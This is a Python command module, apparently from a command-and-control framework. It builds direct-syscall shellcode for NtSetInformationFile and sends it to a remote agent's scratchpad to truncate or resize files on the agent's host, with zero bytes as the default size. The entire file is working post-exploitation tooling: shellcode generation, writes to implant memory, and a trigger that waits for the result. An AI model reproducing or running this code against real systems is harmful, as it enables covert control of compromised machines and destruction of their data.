NAME = "set_eof"
DESCRIPTION = "Directly set the End-Of-File (EOF) / truncate a file using ntdll!NtSetInformationFile."
PARAMS = [
    {"name":"file_handle", "description":"The handle to the open file (must have WRITE access)", "type":"hex"},
    {"name":"new_size", "description":"The new absolute file size in bytes (0 to truncate)", "type":"int", "optional":True, "default":0}
]

# Dependencies: 
# 1. NtSetInformationFile (to update EOF)
# 2. NtWriteVirtualMemory (if the agent requires scratchpad population)
DEPENDENCIES = ["NtSetInformationFile"]

def NtSetInformationFile_EOF_Shellcode(agent_id, file_handle, new_size):
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import build_ptr, push_syscall
    import struct

    agent = Agent.by_id(agent_id)
    syscall = Syscall.sys(agent.id, "NtSetInformationFile")
    scratchpad = agent.scratchpad
    
    # 1. Prepare FILE_END_OF_FILE_INFORMATION structure (8 bytes)
    # Struct: LARGE_INTEGER EndOfFile (8-byte signed integer)
    eof_struct = struct.pack("<q", new_size)
    eof_data, next_ptr = build_ptr(scratchpad, eof_struct)

    # 2. Prepare IO_STATUS_BLOCK (8 bytes) required as output/status buffer
    # Struct: [Status/Pointer]
    io_status_data, io_status_ptr = build_ptr(next_ptr, b"\x00" * 8)

    # 3. Setup Syscall Parameters:
    # args: [FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass]
    # FileEndOfFileInformation is class 20
    params = [
        file_handle,           # Handle
        io_status_ptr,         # &IoStatusBlock
        scratchpad,            # &FileInformation (our new_size buffer)
        8,                     # Length (Size of LARGE_INTEGER)
        20                     # FileInformationClass (FileEndOfFileInformation)
    ]
    
    print(f"[*] Setting EOF of handle {hex(file_handle)} to {new_size} bytes.")
    
    shellcode = push_syscall(syscall, params, agent.debug)
    
    # Total data to write to scratchpad: [EOF_STRUCT] + [IO_STATUS_BLOCK]
    return eof_data + io_status_data, shellcode

def function(agent_id, args):
    from services.orders import write_scratchpad, send_and_wait
    
    file_handle = args[0]
    new_size = args[1]

    # 1. GENERATE DATA AND SHELLCODE
    data, shellcode = NtSetInformationFile_EOF_Shellcode(agent_id, file_handle, new_size)
    
    # 2. WRITE TO AGENT SCRATCHPAD
    write_scratchpad(agent_id, data)
    
    # 3. TRIGGER SYSCALL
    response = send_and_wait(agent_id, shellcode)
    ntstatus = int.from_bytes(response, 'little')
    
    if ntstatus == 0:
        msg = f"Success: File size set to {new_size} bytes."
    else:
        msg = f"Error: NtSetInformationFile failed with {hex(ntstatus)}"

    return {
        "Result": msg,
        "NTSTATUS": hex(ntstatus),
        "Handle": hex(file_handle)
    }